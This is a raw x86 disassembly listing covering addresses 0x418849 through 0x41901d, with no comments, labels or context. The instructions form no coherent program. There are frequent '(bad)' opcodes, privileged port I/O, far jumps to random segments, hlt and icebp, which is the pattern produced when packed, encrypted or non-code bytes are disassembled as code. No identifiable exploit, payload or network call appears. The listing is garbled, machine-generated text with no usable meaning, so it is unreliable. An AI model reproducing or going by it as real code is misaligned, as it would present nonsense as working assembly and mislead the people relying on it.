  418849:	mov    ebx,0xf133ac5a
  41884e:	xchg   BYTE PTR [edi+edx*4+0x47],bh
  418852:	mov    ebx,0x4e16dc7b
  418857:	es jmp 0xd2616247
  41885d:	xor    ebp,DWORD PTR [ebx+0x3f]
  418860:	mov    al,ds:0x3cec4442
  418865:	or     ebp,DWORD PTR [eax+edx*4]
  418868:	push   ebp
  418869:	adc    bl,BYTE PTR [esi-0x54]
  41886c:	jns    0x418836
  41886e:	push   0x23
  418870:	sub    edx,esp
  418872:	mov    esi,0x62f60b2f
  418877:	sub    BYTE PTR [ebp+0x4a],ch
  41887a:	jl     0x4188d3
  41887c:	xor    DWORD PTR [edi+0x39],eax
  41887f:	lods   eax,DWORD PTR ds:[esi]
  418880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418881:	add    al,0x75
  418883:	mul    edi
  418885:	sbb    al,0x56
  418887:	push   esi
  418888:	in     eax,0x20
  41888a:	inc    eax
  41888b:	test   al,0xc1
  41888d:	stos   DWORD PTR es:[edi],eax
  41888e:	not    DWORD PTR [edx]
  418890:	scas   eax,DWORD PTR es:[edi]
  418891:	sub    DWORD PTR [ecx+0x7dbb7db3],esi
  418897:	adc    dl,BYTE PTR [ebx-0xf206d2b]
  41889d:	rcl    BYTE PTR [edx],0xac
  4188a0:	pop    edx
  4188a1:	in     eax,dx
  4188a2:	cdq    
  4188a3:	into   
  4188a4:	cwde   
  4188a5:	sub    dl,BYTE PTR [edx]
  4188a7:	xor    al,0xe
  4188a9:	xor    BYTE PTR [ecx-0x25],ch
  4188ac:	add    BYTE PTR [edi-0x13],0x1b
  4188b0:	fst    QWORD PTR [esi+0x55d78e5b]
  4188b6:	jecxz  0x418934
  4188b8:	gs das 
  4188ba:	adc    edi,DWORD PTR [ebx+0x42375e68]
  4188c0:	(bad)  
  4188c2:	test   esp,edi
  4188c4:	int    0xd1
  4188c6:	mov    ah,0xc8
  4188c8:	hlt    
  4188c9:	popf   
  4188ca:	call   0x51455286
  4188cf:	pop    eax
  4188d0:	ins    DWORD PTR es:[edi],dx
  4188d1:	jbe    0x418904
  4188d3:	loope  0x418949
  4188d5:	cmp    bh,dh
  4188d7:	xchg   ebp,ebp
  4188d9:	retf   
  4188da:	add    esp,DWORD PTR [ebx]
  4188dc:	fnsave [ecx+ecx*8]
  4188df:	pushw  0xac85
  4188e3:	lods   al,BYTE PTR ds:[esi]
  4188e4:	retf   0xa420
  4188e7:	ins    BYTE PTR es:[edi],dx
  4188e8:	adc    esi,eax
  4188ea:	mov    DWORD PTR [edi+0x7587d481],ebx
  4188f0:	lock mov al,BYTE PTR [edx+0x4c]
  4188f4:	cmp    DWORD PTR [esi],ebx
  4188f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f7:	pop    es
  4188f8:	stc    
  4188f9:	mov    eax,ds:0xf9a96c5e
  4188fe:	mov    al,BYTE PTR [ebx-0x61]
  418901:	mov    eax,0xf669ba0c
  418906:	clc    
  418907:	(bad)  
  418908:	shl    DWORD PTR [ebx],cl
  41890a:	inc    edi
  41890b:	adc    al,bh
  41890d:	inc    edx
  41890e:	fbstp  TBYTE PTR [ebx]
  418910:	and    edi,DWORD PTR [esi]
  418912:	push   esp
  418913:	dec    ebx
  418914:	xchg   ebx,eax
  418915:	aam    0xe4
  418917:	push   bp
  418919:	rcr    BYTE PTR [ebp+0x39],cl
  41891c:	repnz mov dh,0x18
  41891f:	mov    ebx,DWORD PTR es:[edx+0x73]
  418923:	pop    esp
  418924:	push   es
  418925:	ret    
  418926:	retf   0x2387
  418929:	jge    0x418909
  41892b:	mov    WORD PTR ds:0xb25267f0,fs
  418931:	push   ds
  418932:	int    0x5a
  418934:	jecxz  0x4188d8
  418936:	push   es
  418937:	(bad)  
  418938:	ror    edx,0xc0
  41893b:	sub    cl,BYTE PTR [ecx+0x33933bb9]
  418941:	jmp    0xe5a3070b
  418946:	jnp    0x4188e1
  418948:	mov    dh,0x40
  41894a:	push   0x3a
  41894c:	pop    ebx
  41894d:	cmp    edx,DWORD PTR [eax+0x2deb0a22]
  418953:	sub    esp,DWORD PTR [ecx-0x5f45159c]
  418959:	enter  0x9bdc,0xb
  41895d:	imul   esi,DWORD PTR [ebx-0x10],0x2d0a952d
  418964:	jbe    0x418975
  418966:	fcmovb st,st(2)
  418968:	mov    ebp,0x3561fcdf
  41896d:	xlat   BYTE PTR ds:[ebx]
  41896e:	add    eax,0x16e57d5c
  418973:	xor    DWORD PTR [ebp+0x3ba85fc4],0x75ab0491
  41897d:	or     ah,bl
  41897f:	push   es
  418980:	xchg   edx,eax
  418981:	mov    al,ds:0xdb6cddb7
  418986:	xor    al,0x85
  418988:	xor    BYTE PTR [edx+0x77f981ff],ah
  41898e:	dec    esp
  41898f:	in     al,dx
  418990:	and    BYTE PTR ds:0xbf4c747,bh
  418996:	fs dec eax
  418998:	repnz cmp al,BYTE PTR [esi+0x4e494145]
  41899f:	mov    ebp,0xb6f4ce79
  4189a4:	test   BYTE PTR gs:[edx],bh
  4189a7:	stc    
  4189a8:	shr    DWORD PTR [edi],1
  4189aa:	jg     0x4189c4
  4189ac:	add    al,0xc
  4189ae:	scas   al,BYTE PTR es:[edi]
  4189af:	inc    eax
  4189b0:	dec    esi
  4189b1:	inc    ebp
  4189b2:	repz div DWORD PTR [ecx*1+0x386fc958]
  4189ba:	test   BYTE PTR [esi+0x274f60a4],cl
  4189c0:	mov    bl,0x36
  4189c2:	adc    al,0xe9
  4189c4:	loop   0x418a42
  4189c6:	xor    edx,ecx
  4189c8:	iret   
  4189c9:	test   BYTE PTR [ecx-0xcbb071a],bl
  4189cf:	cmp    eax,0x732f8644
  4189d4:	pop    esi
  4189d5:	jbe    0x4189c5
  4189d7:	outs   dx,BYTE PTR ds:[esi]
  4189d8:	xchg   ecx,eax
  4189d9:	dec    ecx
  4189da:	adc    eax,0x6db416a0
  4189df:	and    DWORD PTR [eax-0x4fb4800a],edx
  4189e5:	mov    edx,0xfc35cf90
  4189ea:	mov    al,ds:0xa7f3a879
  4189ef:	fwait
  4189f0:	mov    bh,0x3a
  4189f2:	mov    eax,0x18f34bf1
  4189f7:	jmp    0x418996
  4189f9:	mov    al,ds:0x83311720
  4189fe:	mov    edx,0x7230f288
  418a03:	sbb    eax,0x8cd7bc67
  418a08:	sbb    eax,0x6258bca7
  418a0d:	outs   dx,BYTE PTR ds:[esi]
  418a0e:	in     al,0xf4
  418a10:	shl    DWORD PTR [ebp-0x58af5001],0xbb
  418a17:	push   0x68
  418a19:	jmp    0x4189fc
  418a1b:	xchg   esp,eax
  418a1c:	mov    al,0x23
  418a1e:	jbe    0x4189c5
  418a20:	pop    edx
  418a21:	test   ch,0xd8
  418a24:	mov    DWORD PTR [esp+edi*1-0x50cbf302],ebx
  418a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a2c:	push   esp
  418a2d:	push   0xffffffbe
  418a2f:	mov    ebp,0xda5674d1
  418a34:	retf   0x3361
  418a37:	repnz cmp eax,0x57d35334
  418a3d:	cli    
  418a3e:	add    DWORD PTR [edx+0x42c8e24d],esp
  418a44:	nop
  418a45:	adc    al,BYTE PTR ds:0x2602fc4b
  418a4b:	fisttp WORD PTR [edx-0x6c]
  418a4e:	pop    es
  418a4f:	inc    esi
  418a50:	loop   0x4189ef
  418a52:	push   ebx
  418a53:	ficomp WORD PTR [esp+edi*4+0x2cf4c6e8]
  418a5a:	xor    DWORD PTR [ecx+0x40],edx
  418a5d:	push   ecx
  418a5e:	(bad)  
  418a5f:	cld    
  418a60:	scas   al,BYTE PTR es:[edi]
  418a61:	fst    DWORD PTR ds:0x761486fd
  418a67:	or     esp,esp
  418a69:	pop    eax
  418a6a:	es dec esi
  418a6c:	in     eax,0xee
  418a6e:	(bad)  
  418a6f:	lds    ecx,FWORD PTR cs:[edi]
  418a72:	push   edi
  418a73:	mov    dl,0x9e
  418a75:	cmc    
  418a76:	sahf   
  418a77:	loope  0x418a0c
  418a79:	pop    ds
  418a7a:	xchg   bh,al
  418a7c:	add    eax,0x19ee0315
  418a81:	inc    eax
  418a82:	mov    ecx,0x1c74c63d
  418a87:	fyl2xp1 
  418a89:	sub    esi,DWORD PTR [eax]
  418a8b:	ror    DWORD PTR [esi+eax*8],1
  418a8e:	add    ecx,DWORD PTR [bx+si+0x20]
  418a92:	nop
  418a93:	shl    BYTE PTR [ecx-0x33],0x50
  418a97:	call   0xa37428b4
  418a9c:	retf   0x5ee0
  418a9f:	and    bh,BYTE PTR ds:0x106d571b
  418aa5:	iret   
  418aa6:	xor    eax,0x88ed3c93
  418aab:	fcom   DWORD PTR [ebp+0x70]
  418aae:	push   0xffffffc6
  418ab0:	sar    BYTE PTR [eax+0x40],0xb2
  418ab4:	sbb    DWORD PTR [edi+0x7d459100],0x11
  418abb:	mov    ecx,0xc76064b8
  418ac0:	jb     0x418aa7
  418ac2:	xor    DWORD PTR [ebx-0x37],ecx
  418ac5:	sbb    ah,ch
  418ac7:	xchg   BYTE PTR [eax-0xe],dh
  418aca:	push   esi
  418acb:	loope  0x418b45
  418acd:	dec    ebx
  418ace:	and    eax,edi
  418ad0:	cmp    DWORD PTR [edi],0x8b8c6b61
  418ad6:	push   ebp
  418ad7:	mov    dl,0xac
  418ad9:	js     0x418af2
  418adb:	fisttp WORD PTR [ecx-0x54]
  418ade:	xor    DWORD PTR [ecx+0x69],esi
  418ae1:	stos   DWORD PTR es:[edi],eax
  418ae2:	outs   dx,BYTE PTR ds:[esi]
  418ae3:	stc    
  418ae4:	retf   0xb912
  418ae7:	imul   esi,DWORD PTR [esi],0xffffff86
  418aea:	adc    eax,0x7d3dbd83
  418aef:	xor    bl,ah
  418af1:	jne    0x418ae3
  418af3:	not    BYTE PTR [esi]
  418af5:	rcr    BYTE PTR [eax],1
  418af7:	jae    0x418a9b
  418af9:	js     0x418b16
  418afb:	xchg   ebx,eax
  418afc:	leave  
  418afd:	bound  edi,QWORD PTR [edx+ebx*1+0xe8e2363]
  418b04:	xor    eax,0x7efcdc54
  418b09:	loope  0x418b3b
  418b0b:	cmp    al,0x7a
  418b0d:	fstp   DWORD PTR [ecx-0x14701c04]
  418b13:	push   0xffffffe9
  418b15:	jnp    0x418aee
  418b17:	test   eax,0xaef12e2b
  418b1c:	and    bh,dl
  418b1e:	sahf   
  418b1f:	cmp    al,0x9
  418b21:	push   ecx
  418b22:	addr16 jge 0x418b6c
  418b25:	daa    
  418b26:	bound  esi,QWORD PTR [ebp+ebp*1+0x8]
  418b2a:	xchg   ebp,eax
  418b2b:	(bad)  
  418b2c:	retf   0x9ae9
  418b2f:	rol    BYTE PTR [ecx],cl
  418b31:	inc    edi
  418b32:	dec    ecx
  418b33:	mov    BYTE PTR [esi+ebx*8],ah
  418b36:	adc    al,0x9e
  418b38:	mov    cl,0xbb
  418b3a:	mov    esi,0x380e370a
  418b3f:	mov    cl,0x2
  418b41:	ffree  st(3)
  418b43:	out    dx,eax
  418b44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b45:	cmp    DWORD PTR [ecx-0x52e30100],edx
  418b4b:	inc    ebp
  418b4c:	or     esp,DWORD PTR [eax]
  418b4e:	fwait
  418b4f:	or     ebx,DWORD PTR [eax-0x284b6c84]
  418b55:	repnz cmp DWORD PTR [edx+ecx*1],eax
  418b59:	call   0x91ba91b6
  418b5e:	data16 and al,0xb6
  418b61:	push   ebp
  418b62:	adc    ebp,DWORD PTR ds:0x55d551e4
  418b68:	dec    eax
  418b69:	clc    
  418b6a:	mov    ds:0xa596f50,eax
  418b6f:	xchg   ecx,eax
  418b70:	bound  esp,QWORD PTR [ecx+0x70b8831d]
  418b76:	jno    0x418b70
  418b78:	xor    eax,DWORD PTR [ecx]
  418b7a:	mov    ecx,0x6e50cea0
  418b7f:	dec    edi
  418b80:	ret    
  418b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b82:	jbe    0x418ba1
  418b84:	xor    BYTE PTR [esp+ecx*1-0x5],dh
  418b88:	fcmovu st,st(2)
  418b8a:	push   cx
  418b8c:	adc    edx,DWORD PTR [ecx]
  418b8e:	sbb    ebp,DWORD PTR [edi+0x36]
  418b91:	mov    bl,0xcd
  418b93:	mov    ebx,0x8a5d1571
  418b98:	pop    esi
  418b99:	inc    eax
  418b9a:	pop    ecx
  418b9b:	stos   BYTE PTR es:[edi],al
  418b9c:	pop    es
  418b9d:	adc    BYTE PTR [edx+0x555923c8],dl
  418ba3:	in     eax,dx
  418ba4:	pop    ss
  418ba5:	add    edx,DWORD PTR [ecx]
  418ba7:	(bad)  
  418ba8:	push   ecx
  418ba9:	xchg   ecx,eax
  418baa:	test   DWORD PTR [eax-0x27],ebp
  418bad:	vmwrite ebx,ebx
  418bb0:	sbb    dh,ah
  418bb2:	addr16 jmp 0x6befe061
  418bb8:	mov    ebx,0xdcfcc635
  418bbd:	lds    edx,FWORD PTR [edi+0x34290698]
  418bc3:	retf   
  418bc4:	cld    
  418bc5:	leave  
  418bc6:	pop    ecx
  418bc7:	mov    edi,0xe2f9409d
  418bcc:	cmp    bl,BYTE PTR [esi+0x2af17ad2]
  418bd2:	sbb    ah,ch
  418bd4:	aas    
  418bd5:	xchg   esp,eax
  418bd6:	out    dx,al
  418bd7:	cwde   
  418bd8:	cs (bad) 
  418bda:	jmp    0x418c28
  418bdc:	fadd   DWORD PTR ss:[edx-0x6319b055]
  418be3:	rol    bl,cl
  418be5:	test   al,0x78
  418be7:	add    DWORD PTR [ebp-0xf],ecx
  418bea:	inc    esp
  418beb:	dec    esi
  418bec:	pop    edi
  418bed:	cmp    DWORD PTR [ecx],ebp
  418bef:	mov    BYTE PTR [esi-0x50],dh
  418bf2:	jae    0x418bea
  418bf4:	mov    dh,0x60
  418bf6:	push   ecx
  418bf7:	fst    QWORD PTR [esi+0x3e88fea3]
  418bfd:	jmp    0x7b59:0x201fe4a8
  418c04:	push   ebp
  418c05:	fisttp QWORD PTR [ebx+ecx*4+0x4]
  418c09:	mov    eax,ds:0x499180d9
  418c0e:	cs jno 0x418bf9
  418c11:	inc    ebx
  418c12:	pop    esi
  418c13:	cmp    al,0x29
  418c15:	out    dx,al
  418c16:	jae    0x418c8d
  418c18:	push   esi
  418c19:	mov    WORD PTR [edx-0x7285a10],es
  418c1f:	mov    dl,0xa0
  418c21:	(bad)  
  418c22:	sar    DWORD PTR [ebp+0x7837031],cl
  418c28:	sbb    bh,bh
  418c2a:	test   cl,0x9f
  418c2d:	jg     0x418c34
  418c2f:	sub    al,0x47
  418c31:	in     al,dx
  418c32:	and    al,0x99
  418c34:	in     al,0x67
  418c36:	lods   al,BYTE PTR ds:[esi]
  418c37:	test   al,0x79
  418c39:	mov    edi,DWORD PTR [ebx-0x18282831]
  418c3f:	rol    DWORD PTR [esi-0x5cb4c09],1
  418c45:	test   eax,0x5004b58
  418c4a:	(bad)  
  418c4b:	rol    DWORD PTR [edx+0x2],cl
  418c4e:	inc    eax
  418c4f:	clc    
  418c50:	dec    ebx
  418c51:	mov    WORD PTR [ebx-0x7f818812],ss
  418c57:	mov    ecx,0x229b0a67
  418c5c:	or     ebp,DWORD PTR [edx-0x3e]
  418c5f:	xor    bh,bh
  418c61:	cmp    bh,dl
  418c63:	retf   
  418c64:	mov    esp,0xf23966b0
  418c69:	or     DWORD PTR [edx+0x3319d105],0x34
  418c70:	jne    0x418c56
  418c72:	scas   eax,DWORD PTR es:[edi]
  418c73:	push   ss
  418c74:	retf   0xa9c4
  418c77:	fwait
  418c78:	out    dx,eax
  418c79:	push   cs
  418c7a:	dec    ecx
  418c7b:	inc    edi
  418c7c:	div    DWORD PTR [edx-0x36]
  418c7f:	sbb    al,0xf9
  418c81:	loope  0x418ce6
  418c83:	in     al,0xd0
  418c85:	adc    DWORD PTR [edx-0x3e],esp
  418c88:	retf   0xafe1
  418c8b:	mov    esi,0x9d87a826
  418c90:	cs mov bh,0x3b
  418c93:	arpl   WORD PTR gs:[edx+eax*2+0x25974225],bx
  418c9b:	sbb    esi,DWORD PTR [ebx-0x43]
  418c9e:	xchg   esp,eax
  418c9f:	xor    eax,0xe8cbec63
  418ca4:	xor    cl,BYTE PTR [ebx-0x7]
  418ca7:	inc    edi
  418ca8:	int3   
  418ca9:	add    bh,BYTE PTR [edx+0x5b1822e]
  418caf:	pop    esp
  418cb0:	fs cdq 
  418cb2:	dec    esp
  418cb3:	sar    esi,0x2b
  418cb6:	xchg   ecx,eax
  418cb7:	in     eax,dx
  418cb8:	adc    al,0x18
  418cba:	in     al,0x3e
  418cbc:	loop   0x418c64
  418cbe:	not    BYTE PTR [ebx]
  418cc0:	and    al,0x2d
  418cc2:	dec    esp
  418cc3:	pusha  
  418cc4:	xchg   ebx,eax
  418cc5:	das    
  418cc6:	shl    BYTE PTR [ebp-0x7e86fcf9],1
  418ccc:	sbb    BYTE PTR [ecx+0x3c],0x5f
  418cd0:	dec    ebp
  418cd1:	xchg   esp,eax
  418cd2:	call   DWORD PTR [esp+eiz*2]
  418cd5:	loope  0x418cb4
  418cd7:	mov    al,0xc4
  418cd9:	jbe    0x418d08
  418cdb:	in     al,0x88
  418cdd:	push   cs
  418cde:	inc    esp
  418cdf:	jns    0x418cac
  418ce1:	mov    edx,0x532935b
  418ce6:	int3   
  418ce7:	rcl    DWORD PTR ds:0xa519408c,cl
  418ced:	add    eax,0xa8bc9abc
  418cf2:	pushf  
  418cf3:	das    
  418cf4:	ins    BYTE PTR es:[edi],dx
  418cf5:	mov    WORD PTR [ebp+0x2dc86c6d],?
  418cfb:	call   0x16794ad8
  418d00:	add    ebp,DWORD PTR [ebp-0xd]
  418d03:	stc    
  418d04:	scas   al,BYTE PTR es:[edi]
  418d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d06:	jmp    0xb03f:0x1ac4da29
  418d0d:	cmp    BYTE PTR [edi-0xc],0x47
  418d11:	fwait
  418d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d13:	shl    DWORD PTR [ebx+0x378acc07],cl
  418d19:	out    dx,al
  418d1a:	and    edx,DWORD PTR [edi-0x17ac7d6d]
  418d20:	add    DWORD PTR [eax+0x59fba599],0x364be6a6
  418d2a:	call   0xae66:0xfd99ebf8
  418d31:	ds dec edi
  418d33:	das    
  418d34:	addr16 xchg esp,edi
  418d37:	pop    esp
  418d38:	adc    bl,bh
  418d3a:	pop    ebp
  418d3b:	xor    ecx,DWORD PTR [edi+0x4c]
  418d3e:	mov    ds:0x26c1e7e4,al
  418d43:	inc    esp
  418d44:	je     0x418d15
  418d46:	jp     0x418cdb
  418d48:	ins    BYTE PTR es:[edi],dx
  418d49:	pop    ebx
  418d4a:	icebp  
  418d4b:	mov    ds:0x713c00e3,al
  418d50:	lods   al,BYTE PTR ds:[esi]
  418d51:	call   0x846f:0xb988cb60
  418d58:	cmp    BYTE PTR [edx-0x110f009d],bl
  418d5e:	jmp    0x418d4c
  418d60:	pop    ss
  418d61:	dec    edx
  418d62:	ret    0x28ad
  418d65:	jmp    0xec:0xfaf991b6
  418d6c:	xor    BYTE PTR [eax-0x20],bl
  418d6f:	arpl   WORD PTR [esi],sp
  418d71:	aaa    
  418d72:	mov    ch,0x33
  418d74:	sbb    ecx,DWORD PTR [esi]
  418d76:	jmp    FWORD PTR [ebp+0x1b]
  418d79:	into   
  418d7a:	and    al,cl
  418d7c:	mov    ds:0xadc67b4,eax
  418d81:	nop
  418d82:	cmp    DWORD PTR [ecx-0x4e],0xffffffa7
  418d86:	cmp    esi,DWORD PTR [ebx-0x4b]
  418d89:	sbb    DWORD PTR [ebp+0x58],0x2e13e644
  418d90:	push   0xbe4b2e0a
  418d95:	test   DWORD PTR [ebp-0x69],0x9b588f7c
  418d9c:	add    eax,0xd6fa673d
  418da1:	jl     0x418dfa
  418da3:	outs   dx,DWORD PTR ds:[esi]
  418da4:	loope  0x418dac
  418da6:	mov    ecx,0x6b2ecd8e
  418dab:	push   0xbbbaa248
  418db0:	sar    BYTE PTR [edx-0x77],cl
  418db3:	clc    
  418db4:	rcr    ch,1
  418db6:	mov    esp,0xb2d8d203
  418dbb:	shl    ch,0xc5
  418dbe:	add    DWORD PTR [ebp+0x14],ebx
  418dc1:	ins    BYTE PTR es:[edi],dx
  418dc2:	mov    edx,0xfc347b74
  418dc7:	mov    edi,0xa9fe71a4
  418dcc:	mov    esi,0xec8c4eb6
  418dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dd2:	fwait
  418dd3:	adc    DWORD PTR [edi+0x1a849448],edx
  418dd9:	cmp    dl,dl
  418ddb:	js     0x418ded
  418ddd:	add    DWORD PTR [eax],ebp
  418ddf:	idiv   BYTE PTR [edi+0x5a49966b]
  418de5:	inc    edx
  418de6:	jp     0x418dc0
  418de8:	adc    al,0xe7
  418dea:	inc    ebp
  418deb:	sub    al,0x35
  418ded:	xor    ch,BYTE PTR [edi+0x29e14ddf]
  418df3:	pop    esi
  418df4:	mov    al,ds:0x2b3a35a7
  418df9:	ret    0xc8d9
  418dfc:	inc    eax
  418dfd:	cmp    al,0x86
  418dff:	mov    ?,WORD PTR [edi+eiz*4]
  418e02:	or     eax,0xe054aa43
  418e07:	retf   0x9199
  418e0a:	adc    al,0x4c
  418e0c:	lods   eax,DWORD PTR ds:[esi]
  418e0d:	mov    al,0x3
  418e0f:	xor    dx,WORD PTR [esi]
  418e12:	inc    esp
  418e13:	cld    
  418e14:	retf   0xdfd6
  418e17:	jno    0x418e32
  418e19:	les    esi,FWORD PTR [ebx+eiz*4+0x4f]
  418e1d:	ds mov edx,0xdd1e9e
  418e23:	scas   al,BYTE PTR es:[edi]
  418e24:	xchg   BYTE PTR [edi-0x387db67d],ah
  418e2a:	test   BYTE PTR ds:0x4b82aed1,cl
  418e30:	stos   BYTE PTR es:[edi],al
  418e31:	lock out dx,eax
  418e33:	inc    ebp
  418e34:	mov    esi,0x8aeaee11
  418e39:	lds    esp,FWORD PTR [edi]
  418e3b:	inc    ebp
  418e3c:	push   0x1f4e173f
  418e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e42:	mov    ebp,0x9d9785bf
  418e47:	or     eax,0x96592721
  418e4c:	jbe    0x418e0e
  418e4e:	xchg   BYTE PTR gs:[edi+0x62],al
  418e52:	in     eax,0xb4
  418e54:	hlt    
  418e55:	adc    esp,DWORD PTR [edx+0xf]
  418e58:	(bad)  
  418e59:	fdiv   st,st(0)
  418e5b:	xchg   BYTE PTR [edi-0x5],dl
  418e5e:	push   eax
  418e5f:	pop    edx
  418e60:	or     al,0xe7
  418e62:	pop    ecx
  418e63:	jno    0x418e0c
  418e65:	mov    cl,0x9e
  418e67:	lahf   
  418e68:	push   ebx
  418e69:	sbb    al,0x69
  418e6b:	ret    
  418e6c:	(bad)  
  418e6d:	mov    dl,0xda
  418e6f:	sbb    al,0xad
  418e71:	push   esp
  418e72:	fsub   QWORD PTR [edi+0x3bfef615]
  418e78:	sbb    dl,BYTE PTR ds:0x308ebdae
  418e7e:	pop    eax
  418e7f:	out    0x30,al
  418e81:	pushf  
  418e82:	scas   eax,DWORD PTR es:[edi]
  418e83:	rcl    dl,0xdc
  418e86:	ins    BYTE PTR es:[edi],dx
  418e87:	mov    ds:0x1318192e,al
  418e8c:	sub    ah,ah
  418e8e:	sbb    al,0x31
  418e90:	and    DWORD PTR [eax+eiz*1-0x6e44e876],eax
  418e97:	sub    DWORD PTR [edi+0xe238f0d],edi
  418e9d:	add    ah,dl
  418e9f:	push   ecx
  418ea0:	lds    esi,FWORD PTR [ecx+esi*8]
  418ea3:	hlt    
  418ea4:	inc    eax
  418ea5:	jae    0x418e7f
  418ea7:	push   ebx
  418ea8:	gs popa 
  418eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eab:	dec    esi
  418eac:	xchg   edi,eax
  418ead:	shl    DWORD PTR [esi+0x7e26a5bc],cl
  418eb3:	xchg   edx,eax
  418eb4:	jp     0x418ed7
  418eb6:	sub    esi,esp
  418eb8:	out    dx,al
  418eb9:	in     eax,0xf2
  418ebb:	xchg   ebx,eax
  418ebc:	(bad)  
  418ebd:	mov    ebp,0xd4f1eea
  418ec2:	add    al,BYTE PTR [edx-0x80]
  418ec5:	bound  esi,QWORD PTR ds:0x6043e392
  418ecb:	je     0x418f44
  418ecd:	je     0x418f4c
  418ecf:	add    edx,DWORD PTR [eax]
  418ed1:	ins    DWORD PTR es:[edi],dx
  418ed2:	mov    al,ds:0xac81c35f
  418ed7:	adc    esp,edx
  418ed9:	jmp    0x31429515
  418ede:	aam    0xa9
  418ee0:	sti    
  418ee1:	int    0x9d
  418ee3:	in     al,0x5a
  418ee5:	mov    DWORD PTR [ebp+0x5bdcdb90],ebp
  418eeb:	cmp    DWORD PTR [esi+0x13],ebp
  418eee:	cld    
  418eef:	inc    edx
  418ef0:	sub    DWORD PTR [ebx],ebx
  418ef2:	push   ebx
  418ef3:	xchg   esp,eax
  418ef4:	fiadd  WORD PTR ds:0xab411828
  418efa:	(bad)  
  418efb:	ins    BYTE PTR es:[edi],dx
  418efc:	in     eax,0xc4
  418efe:	jb     0x418e85
  418f00:	sar    BYTE PTR [esi+0xb],cl
  418f03:	xchg   ebp,eax
  418f04:	pushf  
  418f05:	icebp  
  418f06:	pop    ebx
  418f07:	push   0xa04217a7
  418f0c:	pusha  
  418f0d:	neg    BYTE PTR [edi]
  418f0f:	mov    cl,0x9a
  418f11:	cs pop ebx
  418f13:	fdivr  QWORD PTR [esi]
  418f15:	jae    0x418f66
  418f17:	pop    eax
  418f18:	hlt    
  418f19:	(bad)  
  418f1a:	push   edi
  418f1b:	push   ebx
  418f1c:	loope  0x418ea6
  418f1e:	jle    0x418f27
  418f20:	pop    edx
  418f21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f22:	scas   eax,DWORD PTR es:[edi]
  418f23:	stc    
  418f24:	fwait
  418f25:	pop    DWORD PTR [ecx-0x5d]
  418f28:	sbb    edx,esp
  418f2a:	mov    al,0x73
  418f2c:	les    ecx,FWORD PTR [ebx-0x4a8a7602]
  418f32:	jle    0x418f12
  418f34:	sahf   
  418f35:	(bad)  
  418f36:	jle    0x418eea
  418f38:	fcmovnu st,st(7)
  418f3a:	cld    
  418f3b:	sbb    eax,0xa1c2ec05
  418f40:	pop    es
  418f41:	aaa    
  418f42:	leave  
  418f43:	scas   eax,DWORD PTR es:[edi]
  418f44:	push   ecx
  418f45:	sub    BYTE PTR [esi-0x492ab3b4],dl
  418f4b:	nop
  418f4c:	push   0x24
  418f4e:	mov    edx,0x7173fdc3
  418f53:	mov    ds:0xcaaf1521,eax
  418f58:	adc    eax,0x9077c984
  418f5d:	lock imul sp,bp,0xffe5
  418f62:	sub    al,0x66
  418f64:	mov    ds:0x9849bdd0,eax
  418f69:	or     bl,BYTE PTR [edx+ecx*8+0x4e]
  418f6d:	ror    bl,0xd3
  418f70:	sub    dh,BYTE PTR [eax+0x70]
  418f73:	(bad)  
  418f74:	xor    BYTE PTR [ebx],cl
  418f76:	mov    ds:0xd09111a3,al
  418f7b:	jbe    0x418f51
  418f7d:	push   0x209d0841
  418f82:	(bad)  
  418f83:	mov    DWORD PTR [ebp+0x17576d9a],ebp
  418f89:	pop    edx
  418f8a:	test   BYTE PTR ss:[edx],dh
  418f8d:	hlt    
  418f8e:	mov    ebx,DWORD PTR [ecx]
  418f90:	add    BYTE PTR [eax-0x71],dl
  418f93:	shl    DWORD PTR [esi-0x6b2e1a6f],1
  418f99:	sar    esp,0xdc
  418f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f9d:	sbb    DWORD PTR [ebp-0xf],0xd2e5b0fa
  418fa4:	rcl    DWORD PTR [ecx-0x11],cl
  418fa7:	add    BYTE PTR [esi-0x70],dh
  418faa:	and    BYTE PTR [edx-0x1e21cf74],bl
  418fb0:	stc    
  418fb1:	xchg   ecx,eax
  418fb2:	mov    ds:0x3c2e04fc,al
  418fb7:	js     0x418f98
  418fb9:	cmp    ah,BYTE PTR [edi+0x6f]
  418fbc:	pushf  
  418fbd:	dec    esp
  418fbe:	mov    ecx,0x31d9db5a
  418fc3:	outs   dx,BYTE PTR ds:[esi]
  418fc4:	mov    eax,0x80507784
  418fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fca:	out    dx,eax
  418fcb:	push   cs
  418fcc:	fs fsubr st(0),st
  418fcf:	mov    al,0x6e
  418fd1:	xor    bl,cl
  418fd3:	add    eax,0xd8a4dadb
  418fd8:	xor    ebp,ecx
  418fda:	outs   dx,DWORD PTR ds:[esi]
  418fdb:	add    al,0xc0
  418fdd:	push   es
  418fde:	in     eax,dx
  418fdf:	xor    eax,edx
  418fe1:	outs   dx,DWORD PTR ds:[esi]
  418fe2:	sbb    cl,BYTE PTR [eax]
  418fe4:	loope  0x418fbc
  418fe6:	mov    esp,0x1e4fa9c1
  418feb:	cs mov dh,0x72
  418fee:	(bad)  
  418fef:	xchg   esp,eax
  418ff0:	xor    dl,BYTE PTR [edi+ebx*2-0x22edf8aa]
  418ff7:	push   ebp
  418ff8:	(bad)
  418ffb:	jne    0x419005
  418ffd:	fiadd  WORD PTR [ecx]
  418fff:	repnz xor DWORD PTR [ecx],ebx
  419002:	idiv   BYTE PTR [esp+eax*1-0x17fc2fe4]
  419009:	aas    
  41900a:	mov    eax,0x6eba387e
  41900f:	cli    
  419010:	int3   
  419011:	or     bh,BYTE PTR [edi]
  419013:	push   ecx
  419014:	xor    BYTE PTR [edi],al
  419016:	xchg   DWORD PTR [eax+edi*4+0x4d],edi
  41901a:	js     0x418ffb
  41901c:	inc    edx
  41901d:	std    
